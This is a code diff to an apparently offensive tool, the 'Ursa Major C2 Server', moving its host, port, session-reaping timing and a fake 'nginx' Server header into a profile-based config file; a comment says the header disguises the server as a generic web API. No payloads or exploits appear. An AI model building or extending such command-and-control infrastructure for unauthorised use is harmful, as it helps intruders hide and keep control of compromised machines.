@@ -42,13 +42,17 @@ from major.db import (
     log_event, get_events
 )
 from major.crypto import UrsaCrypto, generate_session_key
+from major.config import get_config, reload_config
 
 
-# ── Configuration ──
+# ── Configuration (loaded from ursa.yaml with defaults) ──
 
-DEFAULT_PORT = 8443
-DEFAULT_HOST = "0.0.0.0"
-STALE_THRESHOLD = 300  # seconds before session considered stale
+_cfg = get_config()
+DEFAULT_PORT = _cfg.get("major.port", 8443)
+DEFAULT_HOST = _cfg.get("major.host", "0.0.0.0")
+STALE_THRESHOLD = _cfg.get("major.stale_threshold", 300)
+SERVER_HEADER = _cfg.get("major.server_header", "nginx/1.24.0")
+REAPER_INTERVAL = _cfg.get("major.reaper_interval", 30)
 
 
 class UrsaC2Handler(BaseHTTPRequestHandler):
@@ -65,7 +69,7 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
         self.send_header("Content-Type", "application/json")
         self.send_header("Content-Length", str(len(body)))
         # Disguise as a generic web API
-        self.send_header("Server", "nginx/1.24.0")
+        self.send_header("Server", SERVER_HEADER)
         self.send_header("X-Request-Id", os.urandom(8).hex())
         self.end_headers()
         self.wfile.write(body)
@@ -330,7 +334,7 @@ def _session_reaper():
                     _log(f"[!] Session {s['id']} marked stale (no beacon for {int(now - s['last_seen'])}s)")
         except Exception:
             pass
-        time.sleep(30)
+        time.sleep(REAPER_INTERVAL)
 
 
 # ── Logging ──
@@ -385,7 +389,18 @@ def start_server(host=DEFAULT_HOST, port=DEFAULT_PORT):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Ursa Major C2 Server")
-    parser.add_argument("--host", default=DEFAULT_HOST, help="Bind address")
-    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Bind port")
+    parser.add_argument("--host", default=None, help="Bind address")
+    parser.add_argument("--port", type=int, default=None, help="Bind port")
+    parser.add_argument("--profile", default=None, help="Config profile to use")
+    parser.add_argument("--config", default=None, help="Path to config file")
     args = parser.parse_args()
-    start_server(args.host, args.port)
+
+    # Reload config with profile/path if specified
+    if args.profile or args.config:
+        cfg = reload_config(path=args.config, profile=args.profile)
+    else:
+        cfg = get_config()
+
+    host = args.host or cfg.get("major.host", DEFAULT_HOST)
+    port = args.port or cfg.get("major.port", DEFAULT_PORT)
+    start_server(host, port)
